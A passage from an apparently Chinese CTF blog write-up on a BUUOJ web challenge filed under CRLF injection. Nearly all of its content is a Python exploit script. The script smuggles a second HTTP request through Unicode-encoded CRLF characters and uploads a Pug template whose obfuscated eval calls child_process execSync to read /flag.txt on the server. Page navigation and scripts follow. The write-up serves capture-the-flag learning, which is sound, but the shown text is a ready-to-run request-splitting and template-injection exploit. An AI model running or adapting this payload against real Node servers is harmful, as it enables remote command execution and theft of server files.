payload = &quot;&quot;&quot; HTTP/1.1
Host: 127.0.0.1
Connection: keep-alive

POST /file_upload HTTP/1.1
Host: 127.0.0.1
Content-Length: &#123;&#125;
Content-Type: multipart/form-data; boundary=----WebKitFormBoundarysAs7bV3fMHq0JXUt

&#123;&#125;&quot;&quot;&quot;.replace(<span class="hljs-string">&#x27;\n&#x27;</span>, <span class="hljs-string">&#x27;\r\n&#x27;</span>)

body = &quot;&quot;&quot;------WebKitFormBoundarysAs7bV3fMHq0JXUt
Content-Disposition: form-data; name=&quot;file&quot;; filename=&quot;lethe.pug&quot;
Content-Type: ../template

-var x = eval(&quot;glob&quot;+&quot;al.proce&quot;+&quot;ss.mainMo&quot;+&quot;dule.re&quot;+&quot;quire(<span class="hljs-string">&#x27;child_&#x27;</span>+<span class="hljs-string">&#x27;pro&#x27;</span>+<span class="hljs-string">&#x27;cess&#x27;</span>)[<span class="hljs-string">&#x27;ex&#x27;</span>+<span class="hljs-string">&#x27;ecSync&#x27;</span>](<span class="hljs-string">&#x27;cat /flag.txt&#x27;</span>).toString()&quot;)
-return x
------WebKitFormBoundarysAs7bV3fMHq0JXUt--

&quot;&quot;&quot;.replace(<span class="hljs-string">&#x27;\n&#x27;</span>, <span class="hljs-string">&#x27;\r\n&#x27;</span>)

payload = payload.format(len(body), body) \
    .replace(<span class="hljs-string">&#x27;+&#x27;</span>, <span class="hljs-string">&#x27;\u012b&#x27;</span>)             \
    .replace(<span class="hljs-string">&#x27; &#x27;</span>, <span class="hljs-string">&#x27;\u0120&#x27;</span>)             \
    .replace(<span class="hljs-string">&#x27;\r\n&#x27;</span>, <span class="hljs-string">&#x27;\u010d\u010a&#x27;</span>)    \
    .replace(<span class="hljs-string">&#x27;&quot;&#x27;</span>, <span class="hljs-string">&#x27;\u0122&#x27;</span>)             \
    .replace(&quot;&#x27;&quot;, <span class="hljs-string">&#x27;\u0a27&#x27;</span>)             \
    .replace(<span class="hljs-string">&#x27;[&#x27;</span>, <span class="hljs-string">&#x27;\u015b&#x27;</span>)             \
    .replace(<span class="hljs-string">&#x27;]&#x27;</span>, <span class="hljs-string">&#x27;\u015d&#x27;</span>) \
    + <span class="hljs-string">&#x27;GET&#x27;</span> + <span class="hljs-string">&#x27;\u0120&#x27;</span> + <span class="hljs-string">&#x27;/&#x27;</span>

requests.<span class="hljs-keyword">get</span>(
    <span class="hljs-string">&#x27;http://20bad283-63d2-49d3-b7aa-2f07db4d8241.node4.buuoj.cn:81/core?q=&#x27;</span> + payload)

print(requests.<span class="hljs-keyword">get</span>(
    <span class="hljs-string">&#x27;http://20bad283-63d2-49d3-b7aa-2f07db4d8241.node4.buuoj.cn:81/?action=lethe&#x27;</span>).text)</code></pre>
<p>å‚è€ƒï¼š<a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/2894">https://xz.aliyun.com/t/2894</a></p>

            </div>
            <hr>
            <div>
              <div class="post-metas mb-3">
                
                  <div class="post-meta mr-3">
                    <i class="iconfont icon-category"></i>
                    
                      <a class="hover-with-bg" href="/categories/CRLF%E6%B3%A8%E5%85%A5/">CRLFæ³¨å…¥</a>
                    
                  </div>
                
                
              </div>
              
                <p class="note note-warning">æœ¬åšå®¢æ‰€æœ‰æ–‡ç« é™¤ç‰¹åˆ«å£°æ˜å¤–ï¼Œå‡é‡‡ç”¨ <a target="_blank" href="https://creativecommons.org/licenses/by-sa/4.0/deed.zh" rel="nofollow noopener noopener">CC BY-SA 4.0 åè®®</a> ï¼Œè½¬è½½è¯·æ³¨æ˜å‡ºå¤„ï¼</p>
              
              
                <div class="post-prevnext row">
                  <article class="post-prev col-6">
                    
                    
                      <a href="/2021/08/23/un/">
                        <i class="iconfont icon-arrowleft"></i>
                        <span class="hidden-mobile">buuï¼ˆåäºŒï¼‰</span>
                        <span class="visible-mobile">Previous</span>
                      </a>
                    
                  </article>
                  <article class="post-next col-6">
                    
                    
                      <a href="/2021/08/20/hjs/">
                        <span class="hidden-mobile">buuï¼ˆåï¼‰</span>
                        <span class="visible-mobile">Next</span>
                        <i class="iconfont icon-arrowright"></i>
                      </a>
                    
                  </article>
                </div>
              
            </div>

            
          </article>
        </div>
      </div>
    </div>
    
      <div class="d-none d-lg-block col-lg-2 toc-container" id="toc-ctn">
        <div id="toc">
  <p class="toc-header"><i class="iconfont icon-list"></i>&nbsp;TOC</p>
  <div class="toc-body" id="toc-body"></div>
</div>

      </div>
    
  </div>
</div>

<!-- Custom -->


    

    
      <a id="scroll-top-button" href="#" role="button">
        <i class="iconfont icon-arrowup" aria-hidden="true"></i>
      </a>
    

    
      <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel"
     aria-hidden="true">
  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
    <div class="modal-content">
      <div class="modal-header text-center">
        <h4 class="modal-title w-100 font-weight-bold">Search</h4>
        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
          <span aria-hidden="true">&times;</span>
        </button>
      </div>
      <div class="modal-body mx-3">
        <div class="md-form mb-5">
          <input type="text" id="local-search-input" class="form-control validate">
          <label data-error="x" data-success="v"
                 for="local-search-input">keyword</label>
        </div>
        <div class="list-group" id="local-search-result"></div>
      </div>
    </div>
  </div>
</div>
    

    
  </main>

  <footer class="text-center mt-5 py-3">
  <div class="footer-content">
     <a href="https://hexo.io" target="_blank" rel="nofollow noopener"><span>Hexo</span></a> <i class="iconfont icon-love"></i> <a href="https://github.com/fluid-dev/hexo-theme-fluid" target="_blank" rel="nofollow noopener"><span>Fluid</span></a> 
  </div>
  

  

  
</footer>

<!-- SCRIPTS -->

  <script  src="https://cdn.staticfile.org/nprogress/0.2.0/nprogress.min.js" ></script>
  <link  rel="stylesheet" href="https://cdn.staticfile.org/nprogress/0.2.0/nprogress.min.css" />

  <script>
    NProgress.configure({"showSpinner":false,"trickleSpeed":200})
    NProgress.start()
    document.addEventListener('DOMContentLoaded', function() {
      window.NProgress && window.NProgress.inc();
    })
    window.addEventListener('load', function() {
      NProgress.done();
    })
  </script>


<script  src="https://cdn.staticfile.org/jquery/3.5.1/jquery.min.js" ></script>
<script  src="https://cdn.staticfile.org/twitter-bootstrap/4.5.3/js/bootstrap.min.js" ></script>
<script  src="/js/debouncer.js" ></script>
<script  src="/js/events.js" ></script>
<script  src="/js/plugins.js" ></script>

<!-- Plugins -->


  
    <script  src="/js/lazyload.js" ></script>
  



  



  <script  src="https://cdn.staticfile.org/tocbot/4.12.0/tocbot.min.js" ></script>



  <script  src="https://cdn.staticfile.org/fancybox/3.5.7/jquery.fancybox.min.js" ></script>



  <script  src="https://cdn.staticfile.org/anchor-js/4.3.0/anchor.min.js" ></script>



  <script defer src="https://cdn.staticfile.org/clipboard.js/2.0.6/clipboard.min.js" ></script>





  <script  src="https://cdn.staticfile.org/typed.js/2.0.11/typed.min.js" ></script>
  <script>
    (function (window, document) {
      var typing = Fluid.plugins.typing;
      var title = document.getElementById('subtitle').title;
      
      typing(title)
      
    })(window, document);
  </script>



  <script  src="/js/local-search.js" ></script>
  <script>
    (function () {
      var path = "/local-search.xml";
      var inputArea = document.querySelector("#local-search-input");
      inputArea.onclick = function () {
        searchFunc(path, 'local-search-input', 'local-search-result');
        this.onclick = null
      }
    })()
  </script>















<!-- ä¸»é¢˜çš„å¯åŠ¨é¡¹ ä¿æŒåœ¨æœ€åº•éƒ¨ -->
<script  src="/js/boot.js" ></script>



</body>
</html>
